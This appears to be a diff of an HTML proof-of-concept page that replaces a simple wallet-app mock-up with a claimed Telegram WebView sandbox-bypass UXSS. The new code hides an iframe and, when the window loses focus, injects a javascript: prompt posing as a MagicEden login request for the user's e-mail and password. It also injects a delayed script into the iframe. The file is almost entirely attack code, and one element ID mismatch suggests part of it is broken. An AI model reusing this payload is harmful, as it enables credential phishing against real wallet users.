@@ -1,61 +1,34 @@
-<!DOCTYPE html>
-<html lang="en">
+<html lang="en-US">
 <head>
-  <meta charset="UTF-8">
-  <title>UXSS Sandbox PoC - Bottom Nav</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      background: #f2f2f2;
-      display: flex;
-      flex-direction: column;
-      height: 100vh;
-      justify-content: space-between;
-    }
-    main {
-      text-align: center;
-      padding-top: 80px;
-    }
-    .navbar {
-      display: flex;
-      justify-content: space-around;
-      align-items: center;
-      background: #111;
-      padding: 12px 0;
-    }
-    .nav-item {
-      flex: 1;
-      text-align: center;
-      color: #aaa;
-      cursor: pointer;
-      font-size: 24px;
-      user-select: none;
-    }
-    .nav-item:hover {
-      color: #fff;
-    }
-  </style>
-  <script>
-    function openWallet() {
-      // delay supaya terlihat seolah payload muncul setelah masuk dashboard wallet
-      setTimeout(() => {
-        alert("💥 UXSS Payload Executed on Wallet Dashboard!");
-      }, 1200);
-    }
-  </script>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, user-scalable=no">
+	<title> Bypass sandbox Webview UXss Delayed JavaScript execution leak to host app (Telegram)</title>
+	
+	<style>
+		iframe {
+			visibility: hidden;
+		}
+	</style>
+   
+	<script>
+		window.onblur = function() {
+			document.getElementById("iframe").src = "javascript:prompt('In order to access magiceden.io\\nyou must first login on your\\nMagicEden Account.\\n\\nPlease type your e-mail\\nand your password:\\n', 'E-mail / Password.');";
+		}
+	</script>
 </head>
-<body>
-  <main>
-    <h1>Wallet App Simulation</h1>
-    <p>Tap ikon di bawah untuk navigasi.</p>
-  </main>
 
-  <!-- Bottom Navigation -->
-  <div class="navbar">
-    <div class="nav-item">🏠</div>
-    <div class="nav-item" onclick="openWallet()">👛</div>
-    <div class="nav-item">⚙️</div>
-  </div>
+<body>
+   <center>
+		<br>
+		<h1>Click Here</h1>
+	</center>
+   <iframe id="i"></iframe>
+<script>
+  setTimeout(() => {
+    let i = document.getElementById("i").contentWindow;
+    i.document.write("<script>alert('delayed XSS')<\/script>");
+  }, 2000);
+</script>
 </body>
+
 </html>
